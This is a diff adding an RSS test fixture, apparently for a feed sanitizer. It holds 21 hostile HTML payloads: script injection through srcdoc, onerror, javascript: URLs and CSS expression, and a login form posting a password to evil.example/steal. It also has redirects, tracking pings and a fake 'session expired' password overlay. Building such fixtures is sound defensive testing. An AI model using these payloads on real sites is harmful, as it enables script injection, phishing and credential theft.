@@ -1,0 +1,134 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/">
+<channel>
+<title>Dangerous elements, CSS and UI redressing</title>
+<link>https://feed.example.com/</link>
+<description>Test fixture: Dangerous elements, CSS and UI redressing</description>
+<item>
+<title>iframe src</title>
+<link>https://feed.example.com/1</link>
+<guid isPermaLink="false">fixture-1</guid>
+<description><![CDATA[<iframe src="https://evil.example/phish"></iframe>]]></description>
+</item>
+<item>
+<title>iframe srcdoc</title>
+<link>https://feed.example.com/2</link>
+<guid isPermaLink="false">fixture-2</guid>
+<content:encoded><![CDATA[<iframe srcdoc="&lt;script&gt;window.PWNED=2&lt;/script&gt;"></iframe>]]></content:encoded>
+</item>
+<item>
+<title>object data</title>
+<link>https://feed.example.com/3</link>
+<guid isPermaLink="false">fixture-3</guid>
+<description><![CDATA[<object data="https://evil.example/x.swf"></object>]]></description>
+</item>
+<item>
+<title>embed src</title>
+<link>https://feed.example.com/4</link>
+<guid isPermaLink="false">fixture-4</guid>
+<content:encoded><![CDATA[<embed src="https://evil.example/x.swf">]]></content:encoded>
+</item>
+<item>
+<title>form action</title>
+<link>https://feed.example.com/5</link>
+<guid isPermaLink="false">fixture-5</guid>
+<description><![CDATA[<form action="https://evil.example/steal" method="post"><input name="pw"><button>Log in</button></form>]]></description>
+</item>
+<item>
+<title>button formaction</title>
+<link>https://feed.example.com/6</link>
+<guid isPermaLink="false">fixture-6</guid>
+<content:encoded><![CDATA[<button formaction="javascript:window.PWNED=6">x</button>]]></content:encoded>
+</item>
+<item>
+<title>base href hijack</title>
+<link>https://feed.example.com/7</link>
+<guid isPermaLink="false">fixture-7</guid>
+<description><![CDATA[<base href="https://evil.example/"><a href="/relative">x</a>]]></description>
+</item>
+<item>
+<title>meta refresh</title>
+<link>https://feed.example.com/8</link>
+<guid isPermaLink="false">fixture-8</guid>
+<content:encoded><![CDATA[<meta http-equiv="refresh" content="0;url=https://evil.example/">]]></content:encoded>
+</item>
+<item>
+<title>link stylesheet</title>
+<link>https://feed.example.com/9</link>
+<guid isPermaLink="false">fixture-9</guid>
+<description><![CDATA[<link rel="stylesheet" href="https://evil.example/x.css">]]></description>
+</item>
+<item>
+<title>style tag import</title>
+<link>https://feed.example.com/10</link>
+<guid isPermaLink="false">fixture-10</guid>
+<content:encoded><![CDATA[<style>@import url("https://evil.example/x.css"); body{display:none}</style>]]></content:encoded>
+</item>
+<item>
+<title>style attr javascript url</title>
+<link>https://feed.example.com/11</link>
+<guid isPermaLink="false">fixture-11</guid>
+<description><![CDATA[<div style="background:url(javascript:window.PWNED=11)">x</div>]]></description>
+</item>
+<item>
+<title>style attr expression</title>
+<link>https://feed.example.com/12</link>
+<guid isPermaLink="false">fixture-12</guid>
+<content:encoded><![CDATA[<p style="width:expression(window.PWNED=12)">x</p>]]></content:encoded>
+</item>
+<item>
+<title>fixed-position overlay</title>
+<link>https://feed.example.com/13</link>
+<guid isPermaLink="false">fixture-13</guid>
+<description><![CDATA[<div style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;background:#fff">Session expired. Re-enter your password.</div>]]></description>
+</item>
+<item>
+<title>template element</title>
+<link>https://feed.example.com/14</link>
+<guid isPermaLink="false">fixture-14</guid>
+<content:encoded><![CDATA[<template><img src=x onerror=window.PWNED=14></template>]]></content:encoded>
+</item>
+<item>
+<title>img srcset</title>
+<link>https://feed.example.com/15</link>
+<guid isPermaLink="false">fixture-15</guid>
+<description><![CDATA[<img src="https://example.com/a.png" srcset="javascript:window.PWNED=15 1x">]]></description>
+</item>
+<item>
+<title>picture source</title>
+<link>https://feed.example.com/16</link>
+<guid isPermaLink="false">fixture-16</guid>
+<content:encoded><![CDATA[<picture><source srcset="https://evil.example/track.png"><img src="https://example.com/a.png"></picture>]]></content:encoded>
+</item>
+<item>
+<title>video poster</title>
+<link>https://feed.example.com/17</link>
+<guid isPermaLink="false">fixture-17</guid>
+<description><![CDATA[<video poster="javascript:window.PWNED=17" src="https://evil.example/v.mp4"></video>]]></description>
+</item>
+<item>
+<title>anchor ping tracking</title>
+<link>https://feed.example.com/18</link>
+<guid isPermaLink="false">fixture-18</guid>
+<content:encoded><![CDATA[<a href="https://example.com/" ping="https://evil.example/ping">x</a>]]></content:encoded>
+</item>
+<item>
+<title>target blank no rel</title>
+<link>https://feed.example.com/19</link>
+<guid isPermaLink="false">fixture-19</guid>
+<description><![CDATA[<a href="https://example.com/" target="_blank">x</a>]]></description>
+</item>
+<item>
+<title>input type image</title>
+<link>https://feed.example.com/20</link>
+<guid isPermaLink="false">fixture-20</guid>
+<content:encoded><![CDATA[<input type="image" src="x" onerror="window.PWNED=20">]]></content:encoded>
+</item>
+<item>
+<title>applet and isindex</title>
+<link>https://feed.example.com/21</link>
+<guid isPermaLink="false">fixture-21</guid>
+<description><![CDATA[<applet code="x.class"></applet><isindex action="javascript:window.PWNED=21">]]></description>
+</item>
+</channel>
+</rss>
